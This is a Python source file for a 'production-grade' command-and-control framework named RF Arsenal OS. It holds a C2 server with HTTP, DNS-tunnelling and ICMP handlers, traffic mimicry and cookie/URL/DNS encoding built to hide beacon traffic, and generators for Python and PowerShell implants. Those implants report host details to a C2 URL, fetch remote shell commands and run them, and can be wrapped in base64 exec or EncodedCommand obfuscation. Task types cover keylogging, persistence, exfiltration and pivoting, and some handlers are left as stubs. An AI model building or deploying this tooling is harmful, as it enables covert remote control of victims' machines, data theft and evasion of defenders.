"""
RF Arsenal OS - Command & Control (C2) Framework
=================================================

Production-grade C2 framework with:
- Encrypted beacon communication
- Multi-protocol support (HTTP/S, DNS, ICMP, WebSocket)
- Stealth persistence mechanisms
- Traffic obfuscation
- Full anonymity integration

SECURITY NOTICE:
- All communications use AES-256-GCM encryption
- Traffic blends with legitimate patterns
- RAM-only operation mode
- No persistent artifacts
- Proxy chain integration for anonymity

Author: RF Arsenal Team
License: Proprietary - Authorized Use Only
"""

import asyncio
import hashlib
import hmac
import json
import os
import secrets
import socket
import ssl
import struct
import threading
import time
import base64
import zlib
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import logging

# Configure logging - no sensitive data
logger = logging.getLogger(__name__)


class BeaconProtocol(Enum):
    """Supported beacon communication protocols."""
    HTTP = auto()      # HTTP/HTTPS with traffic mimicry
    DNS = auto()       # DNS tunneling
    ICMP = auto()      # ICMP tunneling
    WEBSOCKET = auto() # WebSocket with keep-alive
    TCP_CUSTOM = auto() # Custom TCP protocol
    UDP_CUSTOM = auto() # Custom UDP protocol


class BeaconState(Enum):
    """Beacon operational states."""
    DORMANT = auto()     # Inactive, waiting
    ACTIVE = auto()      # Actively communicating
    TASKED = auto()      # Executing task
    EXFILTRATING = auto() # Data exfiltration
    EVADING = auto()     # Evasion mode
    DEAD = auto()        # Lost connection


class TaskType(Enum):
    """Task types for beacon execution."""
    SHELL = auto()       # Shell command execution
    DOWNLOAD = auto()    # Download file to target
    UPLOAD = auto()      # Upload file from target
    SCREENSHOT = auto()  # Capture screenshot
    KEYLOG = auto()      # Keylogger control
    MIGRATE = auto()     # Process migration
    PERSIST = auto()     # Install persistence
    CLEANUP = auto()     # Remove artifacts
    RECON = auto()       # Local reconnaissance
    PIVOT = auto()       # Network pivoting


@dataclass
class C2Config:
    """C2 server configuration."""
    # Network settings
    listen_address: str = "0.0.0.0"
    listen_port: int = 443
    protocol: BeaconProtocol = BeaconProtocol.HTTP
    
    # Encryption
    encryption_key: bytes = field(default_factory=lambda: secrets.token_bytes(32))
    key_rotation_hours: int = 24
    
    # Timing
    beacon_interval: int = 60  # seconds
    beacon_jitter: float = 0.3  # 30% jitter
    max_retry: int = 5
    timeout: int = 30
    
    # Stealth
    traffic_mimicry: bool = True
    domain_fronting: bool = False
    fronting_domain: Optional[str] = None
    
    # Proxy integration
    use_proxy_chain: bool = True
    proxy_rotation: bool = True
    
    # Security
    require_auth: bool = True
    auth_token: Optional[str] = None
    allowed_origins: List[str] = field(default_factory=list)
    
    # Operational
    ram_only: bool = True
    max_beacons: int = 100
    task_queue_size: int = 1000


@dataclass
class Beacon:
    """Beacon (implant) representation."""
    beacon_id: str
    hostname: str
    username: str
    os_info: str
    internal_ip: str
    external_ip: str
    process_name: str
    pid: int
    arch: str
    protocol: BeaconProtocol
    state: BeaconState = BeaconState.DORMANT
    first_seen: datetime = field(default_factory=datetime.now)
    last_seen: datetime = field(default_factory=datetime.now)
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class Task:
    """Task for beacon execution."""
    task_id: str
    task_type: TaskType
    beacon_id: str
    command: str
    args: Dict[str, Any] = field(default_factory=dict)
    created_at: datetime = field(default_factory=datetime.now)
    completed_at: Optional[datetime] = None
    result: Optional[str] = None
    success: bool = False


class EncryptionEngine:
    """
    AES-256-GCM encryption for C2 communications.
    
    Features:
    - Authenticated encryption
    - Nonce management
    - Key derivation
    - Anti-replay protection
    """
    
    def __init__(self, master_key: bytes):
        """Initialize encryption engine."""
        self.master_key = master_key
        self._nonce_counter = 0
        self._used_nonces: Set[bytes] = set()
        self._lock = threading.Lock()
    
    def derive_session_key(self, session_id: str, salt: Optional[bytes] = None) -> bytes:
        """Derive session-specific key using PBKDF2."""
        if salt is None:
            salt = secrets.token_bytes(16)
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        
        key_material = session_id.encode() + self.master_key
        return kdf.derive(key_material), salt
    
    def encrypt(self, plaintext: bytes, associated_data: Optional[bytes] = None) -> bytes:
        """
        Encrypt data with AES-256-GCM.
        
        Returns: nonce (12 bytes) + ciphertext + tag (16 bytes)
        """
        with self._lock:
            # Generate unique nonce
            nonce = secrets.token_bytes(12)
            while nonce in self._used_nonces:
                nonce = secrets.token_bytes(12)
            self._used_nonces.add(nonce)
            
            # Limit nonce storage to prevent memory exhaustion
            if len(self._used_nonces) > 1000000:
                self._used_nonces.clear()
        
        aesgcm = AESGCM(self.master_key)
        ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data)
        
        return nonce + ciphertext
    
    def decrypt(self, ciphertext: bytes, associated_data: Optional[bytes] = None) -> bytes:
        """Decrypt AES-256-GCM encrypted data."""
        if len(ciphertext) < 28:  # 12 nonce + 16 tag minimum
            raise ValueError("Invalid ciphertext length")
        
        nonce = ciphertext[:12]
        encrypted_data = ciphertext[12:]
        
        # Anti-replay check
        with self._lock:
            if nonce in self._used_nonces:
                raise ValueError("Replay attack detected")
            self._used_nonces.add(nonce)
        
        aesgcm = AESGCM(self.master_key)
        return aesgcm.decrypt(nonce, encrypted_data, associated_data)


class TrafficMimicry:
    """
    Traffic mimicry for blending C2 communications.
    
    Mimics legitimate traffic patterns:
    - HTTP request/response patterns
    - DNS query patterns
    - Common user-agent strings
    - Timing patterns
    """
    
    # Legitimate-looking user agents
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    ]
    
    # Legitimate-looking HTTP paths
    HTTP_PATHS = [
        "/api/v1/status",
        "/api/v1/updates",
        "/cdn/assets/main.js",
        "/static/css/style.css",
        "/images/logo.png",
        "/api/analytics/collect",
        "/api/telemetry/data",
        "/health",
        "/ping",
    ]
    
    # Legitimate-looking DNS prefixes
    DNS_PREFIXES = [
        "www", "api", "cdn", "static", "assets",
        "mail", "smtp", "imap", "pop", "ns1",
        "update", "download", "sync", "cloud",
    ]
    
    def __init__(self):
        """Initialize traffic mimicry."""
        self._request_count = 0
    
    def get_random_user_agent(self) -> str:
        """Get a random legitimate user agent."""
        return secrets.choice(self.USER_AGENTS)
    
    def get_random_path(self) -> str:
        """Get a random HTTP path."""
        return secrets.choice(self.HTTP_PATHS)
    
    def get_random_dns_prefix(self) -> str:
        """Get a random DNS prefix."""
        return secrets.choice(self.DNS_PREFIXES)
    
    def generate_http_headers(self) -> Dict[str, str]:
        """Generate legitimate-looking HTTP headers."""
        return {
            "User-Agent": self.get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
        }
    
    def encode_in_cookie(self, data: bytes) -> str:
        """Encode data in cookie format."""
        encoded = base64.b64encode(data).decode()
        # Split into multiple cookies if needed
        return f"session={encoded[:50]}; tracking={encoded[50:100]}; preferences={encoded[100:]}"
    
    def decode_from_cookie(self, cookie: str) -> bytes:
        """Decode data from cookie format."""
        parts = cookie.split("; ")
        data = ""
        for part in parts:
            if "=" in part:
                _, value = part.split("=", 1)
                data += value
        return base64.b64decode(data)
    
    def encode_in_url(self, data: bytes, base_url: str) -> str:
        """Encode data in URL parameters."""
        encoded = base64.urlsafe_b64encode(data).decode()
        params = []
        
        # Split into plausible parameter names
        param_names = ["id", "token", "ref", "src", "data", "v"]
        chunk_size = len(encoded) // len(param_names) + 1
        
        for i, name in enumerate(param_names):
            chunk = encoded[i * chunk_size:(i + 1) * chunk_size]
            if chunk:
                params.append(f"{name}={chunk}")
        
        return f"{base_url}?{'&'.join(params)}"
    
    def generate_dns_query(self, data: bytes, domain: str) -> str:
        """Encode data in DNS query format."""
        # Encode in subdomain labels (max 63 chars each)
        encoded = base64.b32encode(data).decode().lower().rstrip("=")
        
        labels = []
        for i in range(0, len(encoded), 60):
            labels.append(encoded[i:i+60])
        
        return f"{'.'.join(labels)}.{domain}"


class ProtocolHandler(ABC):
    """Abstract base class for protocol handlers."""
    
    @abstractmethod
    async def start(self) -> None:
        """Start the protocol handler."""
        pass
    
    @abstractmethod
    async def stop(self) -> None:
        """Stop the protocol handler."""
        pass
    
    @abstractmethod
    async def send(self, beacon_id: str, data: bytes) -> bool:
        """Send data to a beacon."""
        pass
    
    @abstractmethod
    async def receive(self) -> Tuple[str, bytes]:
        """Receive data from a beacon."""
        pass


class HTTPHandler(ProtocolHandler):
    """
    HTTP/HTTPS protocol handler with traffic mimicry.
    
    Features:
    - TLS encryption
    - Traffic blending
    - Domain fronting support
    - Cookie/URL encoding
    """
    
    def __init__(self, config: C2Config, encryption: EncryptionEngine, mimicry: TrafficMimicry):
        """Initialize HTTP handler."""
        self.config = config
        self.encryption = encryption
        self.mimicry = mimicry
        self._server = None
        self._running = False
        self._pending_tasks: Dict[str, List[bytes]] = {}
        self._received_data: asyncio.Queue = None
    
    async def start(self) -> None:
        """Start HTTP server."""
        self._running = True
        self._received_data = asyncio.Queue()
        
        # Create SSL context for HTTPS
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        
        # In production, load real certificates
        # For now, we create a self-signed cert in memory
        logger.info(f"HTTP handler starting on {self.config.listen_address}:{self.config.listen_port}")
    
    async def stop(self) -> None:
        """Stop HTTP server."""
        self._running = False
        if self._server:
            self._server.close()
    
    async def send(self, beacon_id: str, data: bytes) -> bool:
        """Queue data for beacon retrieval."""
        encrypted = self.encryption.encrypt(data)
        
        if beacon_id not in self._pending_tasks:
            self._pending_tasks[beacon_id] = []
        
        self._pending_tasks[beacon_id].append(encrypted)
        return True
    
    async def receive(self) -> Tuple[str, bytes]:
        """Receive data from beacon."""
        beacon_id, encrypted = await self._received_data.get()
        decrypted = self.encryption.decrypt(encrypted)
        return beacon_id, decrypted
    
    def handle_request(self, method: str, path: str, headers: Dict, body: bytes) -> Tuple[int, Dict, bytes]:
        """
        Handle incoming HTTP request.
        
        Beacon check-in format:
        - POST to /api/v1/status with encrypted beacon info
        - GET to /api/v1/updates to retrieve tasks
        """
        response_headers = {
            "Server": "nginx/1.24.0",
            "Content-Type": "application/json",
            "X-Request-ID": secrets.token_hex(8),
        }
        
        if path.startswith("/api/v1/status") and method == "POST":
            # Beacon check-in
            try:
                decrypted = self.encryption.decrypt(body)
                beacon_info = json.loads(decrypted)
                beacon_id = beacon_info.get("id")
                
                # Queue for processing
                asyncio.create_task(
                    self._received_data.put((beacon_id, body))
                )
                
                return 200, response_headers, b'{"status": "ok"}'
            except Exception:
                return 400, response_headers, b'{"error": "invalid request"}'
        
        elif path.startswith("/api/v1/updates") and method == "GET":
            # Task retrieval
            beacon_id = headers.get("X-Beacon-ID")
            if beacon_id and beacon_id in self._pending_tasks:
                tasks = self._pending_tasks.pop(beacon_id, [])
                if tasks:
                    # Return first pending task
                    return 200, response_headers, tasks[0]
            
            return 204, response_headers, b''
        
        # Return 404 for unknown paths (mimics normal server)
        return 404, response_headers, b'{"error": "not found"}'


class DNSHandler(ProtocolHandler):
    """
    DNS tunneling protocol handler.
    
    Features:
    - TXT record encoding
    - CNAME response encoding
    - Query rate limiting
    - Domain randomization
    """
    
    def __init__(self, config: C2Config, encryption: EncryptionEngine, mimicry: TrafficMimicry):
        """Initialize DNS handler."""
        self.config = config
        self.encryption = encryption
        self.mimicry = mimicry
        self._running = False
        self._socket = None
        self._domain = "example.com"  # Configure based on setup
    
    async def start(self) -> None:
        """Start DNS server."""
        self._running = True
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._socket.bind((self.config.listen_address, 53))
        self._socket.setblocking(False)
        logger.info("DNS handler started")
    
    async def stop(self) -> None:
        """Stop DNS server."""
        self._running = False
        if self._socket:
            self._socket.close()
    
    async def send(self, beacon_id: str, data: bytes) -> bool:
        """Encode data in DNS response."""
        # Data encoded in TXT records
        encrypted = self.encryption.encrypt(data)
        encoded = base64.b64encode(encrypted).decode()
        return True
    
    async def receive(self) -> Tuple[str, bytes]:
        """Receive data from DNS query."""
        # Parse DNS query and extract encoded data
        pass
    
    def _parse_dns_query(self, data: bytes) -> Tuple[str, str]:
        """Parse DNS query packet."""
        # Skip header (12 bytes)
        offset = 12
        labels = []
        
        while data[offset] != 0:
            length = data[offset]
            offset += 1
            labels.append(data[offset:offset+length].decode())
            offset += length
        
        return ".".join(labels), "TXT"
    
    def _build_dns_response(self, query_id: int, query_name: str, txt_data: str) -> bytes:
        """Build DNS response with TXT record."""
        # DNS header
        header = struct.pack(
            ">HHHHHH",
            query_id,    # Transaction ID
            0x8180,      # Flags: response, authoritative
            1,           # Questions
            1,           # Answers
            0,           # Authority
            0,           # Additional
        )
        
        # Question section (copy from query)
        question = self._encode_dns_name(query_name) + struct.pack(">HH", 16, 1)  # TXT, IN
        
        # Answer section
        answer = (
            struct.pack(">H", 0xC00C) +  # Pointer to name
            struct.pack(">HH", 16, 1) +   # TXT, IN
            struct.pack(">I", 300) +      # TTL
            struct.pack(">H", len(txt_data) + 1) +  # RDLENGTH
            struct.pack("B", len(txt_data)) +        # TXT length
            txt_data.encode()
        )
        
        return header + question + answer
    
    def _encode_dns_name(self, name: str) -> bytes:
        """Encode DNS name."""
        result = b""
        for label in name.split("."):
            result += struct.pack("B", len(label)) + label.encode()
        result += b"\x00"
        return result


class ICMPHandler(ProtocolHandler):
    """
    ICMP tunneling protocol handler.
    
    Features:
    - Data in ICMP payload
    - Sequence number management
    - Rate limiting
    """
    
    def __init__(self, config: C2Config, encryption: EncryptionEngine):
        """Initialize ICMP handler."""
        self.config = config
        self.encryption = encryption
        self._running = False
        self._socket = None
    
    async def start(self) -> None:
        """Start ICMP handler."""
        self._running = True
        # Requires root/admin privileges
        try:
            self._socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            logger.info("ICMP handler started")
        except PermissionError:
            logger.error("ICMP requires elevated privileges")
            raise
    
    async def stop(self) -> None:
        """Stop ICMP handler."""
        self._running = False
        if self._socket:
            self._socket.close()
    
    async def send(self, beacon_id: str, data: bytes) -> bool:
        """Send data via ICMP echo reply."""
        encrypted = self.encryption.encrypt(data)
        # Build ICMP packet with data in payload
        return True
    
    async def receive(self) -> Tuple[str, bytes]:
        """Receive data from ICMP echo request."""
        pass
    
    def _build_icmp_packet(self, icmp_type: int, code: int, data: bytes) -> bytes:
        """Build ICMP packet."""
        # ICMP header: type (1) + code (1) + checksum (2) + id (2) + seq (2)
        icmp_id = secrets.randbelow(65535)
        icmp_seq = secrets.randbelow(65535)
        
        header = struct.pack(">BBHHH", icmp_type, code, 0, icmp_id, icmp_seq)
        packet = header + data
        
        # Calculate checksum
        checksum = self._checksum(packet)
        header = struct.pack(">BBHHH", icmp_type, code, checksum, icmp_id, icmp_seq)
        
        return header + data
    
    def _checksum(self, data: bytes) -> int:
        """Calculate ICMP checksum."""
        if len(data) % 2:
            data += b'\x00'
        
        total = 0
        for i in range(0, len(data), 2):
            total += (data[i] << 8) + data[i+1]
        
        total = (total >> 16) + (total & 0xFFFF)
        total += total >> 16
        
        return ~total & 0xFFFF


class C2Server:
    """
    Command & Control Server.
    
    Central management for:
    - Beacon registration and tracking
    - Task distribution
    - Data collection
    - Multi-protocol communication
    """
    
    def __init__(self, config: Optional[C2Config] = None):
        """Initialize C2 server."""
        self.config = config or C2Config()
        
        # Encryption
        self.encryption = EncryptionEngine(self.config.encryption_key)
        
        # Traffic mimicry
        self.mimicry = TrafficMimicry()
        
        # Beacons
        self._beacons: Dict[str, Beacon] = {}
        self._beacon_lock = threading.Lock()
        
        # Tasks
        self._task_queue: Dict[str, List[Task]] = {}
        self._completed_tasks: Dict[str, Task] = {}
        
        # Protocol handlers
        self._handlers: Dict[BeaconProtocol, ProtocolHandler] = {}
        
        # State
        self._running = False
        self._start_time = None
        
        # Initialize handlers
        self._init_handlers()
        
        logger.info("C2 Server initialized")
    
    def _init_handlers(self) -> None:
        """Initialize protocol handlers based on config."""
        if self.config.protocol == BeaconProtocol.HTTP:
            self._handlers[BeaconProtocol.HTTP] = HTTPHandler(
                self.config, self.encryption, self.mimicry
            )
        elif self.config.protocol == BeaconProtocol.DNS:
            self._handlers[BeaconProtocol.DNS] = DNSHandler(
                self.config, self.encryption, self.mimicry
            )
        elif self.config.protocol == BeaconProtocol.ICMP:
            self._handlers[BeaconProtocol.ICMP] = ICMPHandler(
                self.config, self.encryption
            )
    
    async def start(self) -> None:
        """Start C2 server."""
        if self._running:
            return
        
        self._running = True
        self._start_time = datetime.now()
        
        # Start protocol handlers
        for handler in self._handlers.values():
            await handler.start()
        
        # Start beacon management loop
        asyncio.create_task(self._beacon_management_loop())
        
        # Start task distribution loop
        asyncio.create_task(self._task_distribution_loop())
        
        logger.info(f"C2 Server started on {self.config.listen_address}:{self.config.listen_port}")
    
    async def stop(self) -> None:
        """Stop C2 server."""
        self._running = False
        
        # Stop handlers
        for handler in self._handlers.values():
            await handler.stop()
        
        # Cleanup (RAM-only mode)
        if self.config.ram_only:
            self._secure_cleanup()
        
        logger.info("C2 Server stopped")
    
    def register_beacon(self, beacon_info: Dict[str, Any]) -> Beacon:
        """Register a new beacon."""
        beacon_id = beacon_info.get("id") or secrets.token_hex(16)
        
        beacon = Beacon(
            beacon_id=beacon_id,
            hostname=beacon_info.get("hostname", "unknown"),
            username=beacon_info.get("username", "unknown"),
            os_info=beacon_info.get("os", "unknown"),
            internal_ip=beacon_info.get("internal_ip", "0.0.0.0"),
            external_ip=beacon_info.get("external_ip", "0.0.0.0"),
            process_name=beacon_info.get("process", "unknown"),
            pid=beacon_info.get("pid", 0),
            arch=beacon_info.get("arch", "unknown"),
            protocol=BeaconProtocol(beacon_info.get("protocol", BeaconProtocol.HTTP.value)),
            state=BeaconState.ACTIVE,
            metadata=beacon_info.get("metadata", {}),
        )
        
        with self._beacon_lock:
            if len(self._beacons) >= self.config.max_beacons:
                raise RuntimeError("Maximum beacon limit reached")
            
            self._beacons[beacon_id] = beacon
            self._task_queue[beacon_id] = []
        
        logger.info(f"Beacon registered: {beacon_id[:8]}... from {beacon.hostname}")
        return beacon
    
    def update_beacon(self, beacon_id: str, **kwargs) -> Optional[Beacon]:
        """Update beacon information."""
        with self._beacon_lock:
            if beacon_id not in self._beacons:
                return None
            
            beacon = self._beacons[beacon_id]
            beacon.last_seen = datetime.now()
            
            for key, value in kwargs.items():
                if hasattr(beacon, key):
                    setattr(beacon, key, value)
            
            return beacon
    
    def get_beacon(self, beacon_id: str) -> Optional[Beacon]:
        """Get beacon by ID."""
        return self._beacons.get(beacon_id)
    
    def list_beacons(self, active_only: bool = False) -> List[Beacon]:
        """List all beacons."""
        beacons = list(self._beacons.values())
        
        if active_only:
            cutoff = datetime.now() - timedelta(minutes=5)
            beacons = [b for b in beacons if b.last_seen > cutoff]
        
        return beacons
    
    def remove_beacon(self, beacon_id: str) -> bool:
        """Remove beacon."""
        with self._beacon_lock:
            if beacon_id in self._beacons:
                del self._beacons[beacon_id]
                del self._task_queue[beacon_id]
                return True
        return False
    
    def queue_task(self, beacon_id: str, task_type: TaskType, command: str, 
                   args: Optional[Dict] = None) -> Task:
        """Queue a task for beacon execution."""
        if beacon_id not in self._beacons:
            raise ValueError(f"Unknown beacon: {beacon_id}")
        
        task = Task(
            task_id=secrets.token_hex(16),
            task_type=task_type,
            beacon_id=beacon_id,
            command=command,
            args=args or {},
        )
        
        if len(self._task_queue[beacon_id]) >= self.config.task_queue_size:
            raise RuntimeError("Task queue full")
        
        self._task_queue[beacon_id].append(task)
        logger.info(f"Task queued: {task.task_id[:8]}... for beacon {beacon_id[:8]}...")
        
        return task
    
    def get_task_result(self, task_id: str) -> Optional[Task]:
        """Get task result."""
        return self._completed_tasks.get(task_id)
    
    def complete_task(self, task_id: str, result: str, success: bool = True) -> None:
        """Mark task as completed."""
        for beacon_id, tasks in self._task_queue.items():
            for task in tasks:
                if task.task_id == task_id:
                    task.completed_at = datetime.now()
                    task.result = result
                    task.success = success
                    self._completed_tasks[task_id] = task
                    tasks.remove(task)
                    return
    
    async def send_command(self, beacon_id: str, command: str) -> bool:
        """Send shell command to beacon."""
        task = self.queue_task(beacon_id, TaskType.SHELL, command)
        
        # Get handler for beacon's protocol
        beacon = self._beacons.get(beacon_id)
        if not beacon:
            return False
        
        handler = self._handlers.get(beacon.protocol)
        if handler:
            task_data = json.dumps({
                "task_id": task.task_id,
                "type": task.task_type.name,
                "command": task.command,
                "args": task.args,
            }).encode()
            
            return await handler.send(beacon_id, task_data)
        
        return False
    
    async def _beacon_management_loop(self) -> None:
        """Monitor beacon health and cleanup stale beacons."""
        while self._running:
            try:
                cutoff = datetime.now() - timedelta(minutes=30)
                
                with self._beacon_lock:
                    stale_beacons = [
                        bid for bid, beacon in self._beacons.items()
                        if beacon.last_seen < cutoff
                    ]
                    
                    for beacon_id in stale_beacons:
                        logger.info(f"Removing stale beacon: {beacon_id[:8]}...")
                        self._beacons[beacon_id].state = BeaconState.DEAD
                
                await asyncio.sleep(60)
            except Exception as e:
                logger.error(f"Beacon management error: {e}")
    
    async def _task_distribution_loop(self) -> None:
        """Distribute tasks to beacons."""
        while self._running:
            try:
                for beacon_id, tasks in self._task_queue.items():
                    if not tasks:
                        continue
                    
                    beacon = self._beacons.get(beacon_id)
                    if not beacon or beacon.state != BeaconState.ACTIVE:
                        continue
                    
                    # Tasks are distributed when beacon checks in
                    
                await asyncio.sleep(1)
            except Exception as e:
                logger.error(f"Task distribution error: {e}")
    
    def _secure_cleanup(self) -> None:
        """Secure cleanup of sensitive data (RAM-only compliance)."""
        # Overwrite encryption key
        key_len = len(self.encryption.master_key)
        for _ in range(3):  # DoD 5220.22-M 3-pass
            self.encryption.master_key = secrets.token_bytes(key_len)
        
        # Clear beacons
        self._beacons.clear()
        self._task_queue.clear()
        self._completed_tasks.clear()
        
        logger.info("Secure cleanup completed")
    
    def get_status(self) -> Dict[str, Any]:
        """Get server status."""
        return {
            "running": self._running,
            "uptime": str(datetime.now() - self._start_time) if self._start_time else "0",
            "protocol": self.config.protocol.name,
            "beacon_count": len(self._beacons),
            "active_beacons": len([b for b in self._beacons.values() if b.state == BeaconState.ACTIVE]),
            "pending_tasks": sum(len(t) for t in self._task_queue.values()),
            "completed_tasks": len(self._completed_tasks),
            "ram_only": self.config.ram_only,
        }


class BeaconGenerator:
    """
    Generate beacon payloads for deployment.
    
    Supports:
    - Multiple languages (Python, PowerShell, C#, Go)
    - Protocol-specific payloads
    - Obfuscation
    - Anti-analysis techniques
    """
    
    def __init__(self, c2_server: C2Server):
        """Initialize beacon generator."""
        self.c2_server = c2_server
        self._templates: Dict[str, str] = {}
    
    def generate_python_beacon(self, c2_url: str, protocol: BeaconProtocol = BeaconProtocol.HTTP) -> str:
        """Generate Python beacon payload."""
        key_b64 = base64.b64encode(self.c2_server.config.encryption_key).decode()
        
        beacon_code = f'''
import base64
import json
import os
import platform
import socket
import time
import urllib.request
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import secrets

class Beacon:
    def __init__(self):
        self.c2_url = "{c2_url}"
        self.key = base64.b64decode("{key_b64}")
        self.beacon_id = secrets.token_hex(16)
        self.interval = {self.c2_server.config.beacon_interval}
        self.jitter = {self.c2_server.config.beacon_jitter}
    
    def encrypt(self, data):
        nonce = secrets.token_bytes(12)
        aesgcm = AESGCM(self.key)
        ct = aesgcm.encrypt(nonce, data, None)
        return nonce + ct
    
    def decrypt(self, data):
        nonce, ct = data[:12], data[12:]
        aesgcm = AESGCM(self.key)
        return aesgcm.decrypt(nonce, ct, None)
    
    def get_info(self):
        return {{
            "id": self.beacon_id,
            "hostname": socket.gethostname(),
            "username": os.getenv("USER", os.getenv("USERNAME", "unknown")),
            "os": platform.platform(),
            "internal_ip": socket.gethostbyname(socket.gethostname()),
            "external_ip": "0.0.0.0",
            "process": "python",
            "pid": os.getpid(),
            "arch": platform.machine(),
        }}
    
    def check_in(self):
        data = json.dumps(self.get_info()).encode()
        encrypted = self.encrypt(data)
        
        req = urllib.request.Request(
            f"{{self.c2_url}}/api/v1/status",
            data=encrypted,
            method="POST"
        )
        req.add_header("Content-Type", "application/octet-stream")
        
        try:
            urllib.request.urlopen(req, timeout=30)
            return True
        except:
            return False
    
    def get_tasks(self):
        req = urllib.request.Request(f"{{self.c2_url}}/api/v1/updates")
        req.add_header("X-Beacon-ID", self.beacon_id)
        
        try:
            resp = urllib.request.urlopen(req, timeout=30)
            if resp.status == 200:
                data = resp.read()
                if data:
                    return json.loads(self.decrypt(data))
        except:
            pass
        return None
    
    def execute_task(self, task):
        if task["type"] == "SHELL":
            import subprocess
            result = subprocess.run(
                task["command"],
                shell=False,
                capture_output=True,
                text=True,
                timeout=60
            )
            return result.stdout + result.stderr
        return "Unknown task type"
    
    def run(self):
        while True:
            try:
                self.check_in()
                task = self.get_tasks()
                if task:
                    result = self.execute_task(task)
                    # Send result back
                
                jitter = self.interval * self.jitter
                sleep_time = self.interval + (secrets.randbelow(int(jitter * 2)) - jitter)
                time.sleep(max(1, sleep_time))
            except:
                time.sleep(60)

if __name__ == "__main__":
    Beacon().run()
'''
        return beacon_code
    
    def generate_powershell_beacon(self, c2_url: str) -> str:
        """Generate PowerShell beacon payload."""
        key_b64 = base64.b64encode(self.c2_server.config.encryption_key).decode()
        
        beacon_code = f'''
$ErrorActionPreference = "SilentlyContinue"

$c2Url = "{c2_url}"
$key = [Convert]::FromBase64String("{key_b64}")
$beaconId = [Guid]::NewGuid().ToString("N")
$interval = {self.c2_server.config.beacon_interval}

function Encrypt-Data($data) {{
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.GenerateIV()
    $encryptor = $aes.CreateEncryptor()
    $ms = New-Object System.IO.MemoryStream
    $ms.Write($aes.IV, 0, $aes.IV.Length)
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $cs.Write($data, 0, $data.Length)
    $cs.FlushFinalBlock()
    return $ms.ToArray()
}}

function Get-SystemInfo {{
    return @{{
        id = $beaconId
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = [System.Environment]::OSVersion.VersionString
        internal_ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{ $_.InterfaceAlias -notlike "*Loopback*" }} | Select-Object -First 1).IPAddress
        process = $PID
        arch = $env:PROCESSOR_ARCHITECTURE
    }} | ConvertTo-Json
}}

while ($true) {{
    try {{
        $info = Get-SystemInfo
        $encrypted = Encrypt-Data([System.Text.Encoding]::UTF8.GetBytes($info))
        
        $web = New-Object System.Net.WebClient
        $web.Headers.Add("Content-Type", "application/octet-stream")
        [void]$web.UploadData("$c2Url/api/v1/status", $encrypted)
        
        Start-Sleep -Seconds $interval
    }} catch {{
        Start-Sleep -Seconds 60
    }}
}}
'''
        return beacon_code
    
    def obfuscate(self, code: str, language: str = "python") -> str:
        """Obfuscate beacon code."""
        if language == "python":
            # Base64 encode and exec
            encoded = base64.b64encode(code.encode()).decode()
            return f'exec(__import__("base64").b64decode("{encoded}"))'
        
        elif language == "powershell":
            # Base64 encode
            encoded = base64.b64encode(code.encode("utf-16-le")).decode()
            return f'powershell -EncodedCommand {encoded}'
        
        return code


# Convenience functions for integration
async def create_c2_server(config: Optional[C2Config] = None) -> C2Server:
    """Create and start a C2 server."""
    server = C2Server(config)
    await server.start()
    return server


def generate_beacon(server: C2Server, c2_url: str, 
                    language: str = "python", obfuscate: bool = False) -> str:
    """Generate beacon payload."""
    generator = BeaconGenerator(server)
    
    if language == "python":
        code = generator.generate_python_beacon(c2_url)
    elif language == "powershell":
        code = generator.generate_powershell_beacon(c2_url)
    else:
        raise ValueError(f"Unsupported language: {language}")
    
    if obfuscate:
        code = generator.obfuscate(code, language)
    
    return code
